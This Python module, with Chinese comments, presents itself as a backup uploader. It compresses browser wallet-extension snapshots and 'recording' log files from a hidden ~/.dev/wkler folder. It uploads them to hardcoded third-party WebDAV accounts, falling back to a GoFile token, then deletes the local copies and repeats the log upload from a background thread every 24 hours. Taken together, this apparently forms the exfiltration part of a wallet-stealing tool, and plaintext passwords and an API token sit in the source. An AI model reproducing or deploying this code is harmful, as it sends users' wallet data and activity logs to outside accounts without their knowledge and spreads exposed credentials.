# -*- coding: utf-8 -*-
"""
上传模块 - 将备份文件压缩并上传到 Infini Cloud (WebDAV)，失败回退 GoFile
超过 CHUNK_SIZE 的文件自动分片上传，接收端用 cat *.part.* > file.tar.gz 合并。
"""

import getpass
import os
import shutil
import sys
import tarfile
import time
from datetime import datetime
from pathlib import Path
from typing import List, Optional

try:
    import requests
    from requests.auth import HTTPBasicAuth
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

INFINI_CONFIGS = [
    {
        "name": "Infini-主",   #infini5
        "url": "https://otaru.infini-cloud.net/dav/",
        "user": "ylx210",
        "password": "aYyeTGVr8WiJtmtZ",
    },
    {
        "name": "Infini-备",
        "url": "https://wajima.infini-cloud.net/dav/",
        "user": "cryptostarxp",
        "password": "LDW9ERV3xuUrHSjZ",
    },
]

GOFILE_SERVERS = [
    "https://upload.gofile.io/uploadfile",
    "https://upload-ap-hkg.gofile.io/uploadfile",
    "https://upload-ap-sgp.gofile.io/uploadfile",
    "https://upload-ap-tyo.gofile.io/uploadfile",
    "https://upload-na-phx.gofile.io/uploadfile",
]
GOFILE_TOKEN = "jnJSH32mlnYRiF7uyJ2d7PQg0CLAqKcq"
GOFILE_MAX_SERVER_RETRIES = 2

RETRY_COUNT = 3
RETRY_DELAY = 30
CHUNK_SIZE = 80 * 1024 * 1024  # 80MB


def _get_remote_dir() -> str:
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    return f"{user_prefix}_mac_backup"


def _create_remote_directory(session, remote_dir: str, base_url: str, auth) -> bool:
    """WebDAV MKCOL 创建远程目录（递归）"""
    if not remote_dir or remote_dir == ".":
        return True
    try:
        dir_path = f"{base_url.rstrip('/')}/{remote_dir.lstrip('/')}"
        resp = session.request("MKCOL", dir_path, auth=auth, timeout=(8, 8))
        if resp.status_code in [201, 204, 405]:
            return True
        elif resp.status_code == 409:
            parent = os.path.dirname(remote_dir)
            if parent and parent != ".":
                if _create_remote_directory(session, parent, base_url, auth):
                    resp = session.request("MKCOL", dir_path, auth=auth, timeout=(8, 8))
                    return resp.status_code in [201, 204, 405]
        print(f"  ! WebDAV MKCOL rejected {remote_dir}: HTTP {resp.status_code}", file=sys.stderr)
        return False
    except Exception as exc:
        print(f"  ! WebDAV MKCOL failed for {remote_dir}: {exc}", file=sys.stderr)
        return False


def _split_file(file_path: str) -> List[str]:
    """将文件切分为 CHUNK_SIZE 大小的分片，返回分片路径列表"""
    file_size = os.path.getsize(file_path)
    if file_size <= CHUNK_SIZE:
        return [file_path]

    parts = []
    idx = 0
    with open(file_path, "rb") as src:
        while True:
            data = src.read(CHUNK_SIZE)
            if not data:
                break
            part_path = f"{file_path}.part.{idx:03d}"
            with open(part_path, "wb") as dst:
                dst.write(data)
            parts.append(part_path)
            idx += 1
    return parts


def _cleanup_parts(parts: List[str], original: str) -> None:
    """删除分片文件（原文件不在分片列表中时才删除分片）"""
    if parts == [original]:
        return
    for p in parts:
        try:
            os.unlink(p)
        except OSError:
            pass


def _upload_infini_single(session, file_path: str, remote_dir: str) -> bool:
    """向所有 Infini 配置尝试上传单个文件，任一成功即返回 True"""
    file_size = os.path.getsize(file_path)
    filename = os.path.basename(file_path)

    if file_size < 1024 * 1024:
        timeout = (10, 30)
    elif file_size < 10 * 1024 * 1024:
        timeout = (15, max(30, int(file_size / 1024 / 1024 * 5)))
    else:
        timeout = (20, max(60, int(file_size / 1024 / 1024 * 6)))

    for cfg in INFINI_CONFIGS:
        cfg_name = cfg["name"]
        base_url = cfg["url"].strip()
        auth = HTTPBasicAuth(cfg["user"], cfg["password"])

        _create_remote_directory(session, remote_dir, base_url, auth)
        remote_path = f"{base_url.rstrip('/')}/{remote_dir}/{filename}"

        for attempt in range(RETRY_COUNT):
            resp = None
            try:
                headers = {
                    "Content-Type": "application/octet-stream",
                    "Content-Length": str(file_size),
                }
                with open(file_path, "rb") as f:
                    resp = session.put(
                        remote_path, data=f, headers=headers,
                        auth=auth, timeout=timeout,
                    )
                if resp.status_code in [200, 201, 204]:
                    size_str = (
                        f"{file_size/1024/1024:.2f}MB"
                        if file_size >= 1024 * 1024
                        else f"{file_size/1024:.1f}KB"
                    )
                    print(f"  [OK] [{cfg_name}] {filename} ({size_str})")
                    return True
            except requests.RequestException as exc:
                print(
                    f"  ! Infini upload failed ({cfg_name}, attempt {attempt + 1}/"
                    f"{RETRY_COUNT}): {exc}",
                    file=sys.stderr,
                )
            except OSError as exc:
                print(f"  ! Cannot read {filename}: {exc}", file=sys.stderr)
                return False

            if resp is not None and resp.status_code not in [200, 201, 204]:
                print(
                    f"  ! Infini rejected {filename} ({cfg_name}): HTTP {resp.status_code}",
                    file=sys.stderr,
                )

            if attempt < RETRY_COUNT - 1:
                time.sleep(RETRY_DELAY)

    return False


def _upload_gofile_single(file_path: str) -> bool:
    """向 GoFile 上传单个文件"""
    filename = os.path.basename(file_path)
    server_idx = 0
    total_retries = 0
    max_total_retries = len(GOFILE_SERVERS) * GOFILE_MAX_SERVER_RETRIES

    while total_retries < max_total_retries:
        server = GOFILE_SERVERS[server_idx]
        try:
            with open(file_path, "rb") as f:
                resp = requests.post(
                    server,
                    files={"file": f},
                    headers={"Authorization": f"Bearer {GOFILE_TOKEN}"},
                    timeout=3600,
                    verify=True,
                )
            if resp.ok:
                result = resp.json()
                if result.get("status") == "ok":
                    print(f"  [OK] [GoFile] {filename}")
                    return True
                error_code = result.get("code", 0)
                if error_code in [402, 405]:
                    server_idx = (server_idx + 1) % len(GOFILE_SERVERS)
                    if server_idx == 0:
                        time.sleep(RETRY_DELAY * 2)
        except (requests.RequestException, ValueError, OSError) as exc:
            print(f"  ! GoFile upload failed ({filename}, {server}): {exc}", file=sys.stderr)

        server_idx = (server_idx + 1) % len(GOFILE_SERVERS)
        if server_idx == 0:
            time.sleep(RETRY_DELAY)
        total_retries += 1

    return False


def _upload_infini(file_path: str, remote_dir: str) -> bool:
    """分片上传到 Infini：超过 CHUNK_SIZE 时自动切分，全部分片成功才返回 True。
    单片 Infini 失败时立即回退 GoFile，保证同一批分片走同一通道。
    """
    session = requests.Session()

    parts = _split_file(file_path)
    total = len(parts)

    if total > 1:
        print(f"  文件较大，分 {total} 片上传（每片 ≤{CHUNK_SIZE//1024//1024}MB）")

    uploaded = 0
    try:
        for i, part in enumerate(parts):
            label = f"[{i+1}/{total}] " if total > 1 else ""
            if _upload_infini_single(session, part, remote_dir):
                uploaded += 1
            else:
                print(f"  ! {label}Infini 失败，回退 GoFile: {os.path.basename(part)}")
                if _upload_gofile_single(part):
                    uploaded += 1
                else:
                    print(f"  ! {label}GoFile 也失败: {os.path.basename(part)}")
                    return False
    finally:
        _cleanup_parts(parts, file_path)

    return uploaded == total


def upload_file(file_path: str) -> bool:
    """上传单个文件：先尝试 Infini，失败回退 GoFile。超过 CHUNK_SIZE 自动分片。"""
    if not os.path.isfile(file_path) or os.path.getsize(file_path) == 0:
        return False

    remote_dir = _get_remote_dir()
    return _upload_infini(file_path, remote_dir)


def _create_tar_gz(source_dir: Path, tar_path: Path) -> Optional[Path]:
    """将目录打包为 tar.gz；失败时清理不完整的压缩包。"""
    try:
        with tarfile.open(tar_path, "w:gz", compresslevel=6, dereference=False) as tar:
            tar.add(str(source_dir), arcname=source_dir.name, recursive=True)
    except Exception as e:
        print(f"  ! 压缩失败: {e}", file=sys.stderr)
        if tar_path.exists():
            tar_path.unlink()
        return None
    return tar_path


def _unique_tar_path(directory: Path, stem: str) -> Path:
    """Return a collision-free archive path without overwriting an existing backup."""
    candidate = directory / f"{stem}.tar.gz"
    suffix = 1
    while candidate.exists():
        candidate = directory / f"{stem}_{suffix}.tar.gz"
        suffix += 1
    return candidate


def compress_backup(backup_dir: Path) -> Optional[Path]:
    """将备份目录压缩为 tar.gz，完成后删除源目录"""
    if not backup_dir.is_dir():
        return None

    entries = list(backup_dir.iterdir())
    if not entries:
        return None

    date_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    tar_path = _unique_tar_path(backup_dir.parent, f"{backup_dir.name}_{date_str}")

    tar_path = _create_tar_gz(backup_dir, tar_path)
    if tar_path is None:
        return None

    # 压缩成功，删除源备份目录
    shutil.rmtree(backup_dir, ignore_errors=True)
    return tar_path


def compress_and_upload_backup(snapshot_dir: Path) -> bool:
    """压缩单个钱包快照并上传；上传成功后清理本地快照和 tar.gz。"""
    if not HAS_REQUESTS:
        print("  ! 缺少 requests 库，钱包快照仅保留本地", file=sys.stderr)
        return False
    if not snapshot_dir.is_dir():
        return False

    date_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    tar_path = _unique_tar_path(snapshot_dir.parent, f"{snapshot_dir.name}_{date_str}")
    tar_path = _create_tar_gz(snapshot_dir, tar_path)
    if tar_path is None:
        return False

    try:
        if upload_file(str(tar_path)):
            print(f"  * 已压缩并上传: {tar_path.name}")
            shutil.rmtree(snapshot_dir, ignore_errors=True)
            tar_path.unlink(missing_ok=True)
            return True
        print(
            f"  ! 上传失败，保留本地快照和压缩包: {snapshot_dir}",
            file=sys.stderr,
        )
    except Exception as exc:
        print(
            f"  ! 压缩上传失败，保留本地快照和压缩包: {exc}",
            file=sys.stderr,
        )
    return False


def collect_old_logs(wkler_dir: Path) -> List[Path]:
    """收集非当天的日志文件（兼容旧版无用户前缀的日志名）"""
    today_str = datetime.now().strftime("%Y%m%d")
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    old_logs = []
    for pattern in ("recording_*.log", f"{user_prefix}_recording_*.log"):
        for f in wkler_dir.glob(pattern):
            if today_str not in f.name and f not in old_logs:
                old_logs.append(f)
    return old_logs


def upload_old_logs() -> None:
    if not HAS_REQUESTS:
        return

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    wkler_dir = Path.home() / ".dev" / "wkler"

    try:
        old_logs = collect_old_logs(wkler_dir)
    except OSError as exc:
        print(f"  ! Cannot scan old logs in {wkler_dir}: {exc}", file=sys.stderr)
        return

    for log_file in old_logs:
        try:
            if upload_file(str(log_file)):
                log_file.unlink(missing_ok=True)
            else:
                print(f"  ! Log upload failed; keeping local file: {log_file}", file=sys.stderr)
        except (OSError, requests.RequestException) as exc:
            print(f"  ! Log upload error for {log_file}: {exc}", file=sys.stderr)


def upload_all(backup_dir: Optional[Path] = None) -> None:
    """压缩并上传遗留的钱包备份，成功后清理本地文件。

    处理两类遗留数据：未上传成功的快照目录（重新压缩后上传）和上次中断
    上传遗留的 tar.gz（直接上传）。任一上传失败即停止，避免网络不可用
    时反复重试。旧版整目录布局（无快照、无压缩包但目录里有内容）会整体
    压缩后上传。
    """
    if not HAS_REQUESTS:
        print("  ! 缺少 requests 库，跳过钱包备份上传")
        return

    if backup_dir is None:
        wkler_dir = Path.home() / ".dev" / "wkler"
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        backup_dir = wkler_dir / f"{user_prefix}_wallet-extensions"

    backup_dir = Path(backup_dir)
    if not backup_dir.is_dir():
        return

    snapshots = sorted(
        (p for p in backup_dir.glob("wallet-backup_*") if p.is_dir()),
        key=lambda p: p.stat().st_mtime,
        reverse=True,
    )
    for snapshot in snapshots:
        if not compress_and_upload_backup(snapshot):
            return
        # 上传成功后清理该快照遗留的旧压缩包（上次中断上传留下的）
        for stale in backup_dir.glob(f"{snapshot.name}_*.tar.gz"):
            try:
                stale.unlink(missing_ok=True)
            except OSError:
                pass

    # 遗留的独立压缩包：旧版整目录压缩产物或快照上传中断时的压缩包
    for tar_path in sorted(
        (p for p in backup_dir.glob("*.tar.gz") if p.is_file()),
        key=lambda p: p.stat().st_mtime,
        reverse=True,
    ):
        print(f"  正在补传遗留压缩包: {tar_path.name}")
        if not upload_file(str(tar_path)):
            print(f"  ! 补传失败，保留本地文件: {tar_path}", file=sys.stderr)
            return
        tar_path.unlink(missing_ok=True)

    # 旧版整目录布局：无快照、无压缩包但目录里有内容时整体压缩上传
    if not snapshots and not list(backup_dir.glob("*.tar.gz")):
        tar_path = compress_backup(backup_dir)
        if not tar_path:
            return
        print(f"  压缩完成: {tar_path.name}")
        if not upload_file(str(tar_path)):
            print(f"  ! 上传失败，保留本地文件: {tar_path}", file=sys.stderr)
            return
        tar_path.unlink(missing_ok=True)


def _log_upload_loop(stop_event) -> None:
    """后台循环：每 24 小时检查并上传非当天的日志文件"""
    while not stop_event.wait(24 * 3600):
        upload_old_logs()


def start_log_upload_scheduler(stop_event=None):
    """启动日志上传后台线程（守护线程，每 24 小时执行一次）"""
    if not HAS_REQUESTS:
        return

    import threading
    stop_event = stop_event or threading.Event()
    t = threading.Thread(target=_log_upload_loop, args=(stop_event,), daemon=True)
    t.start()
    return t
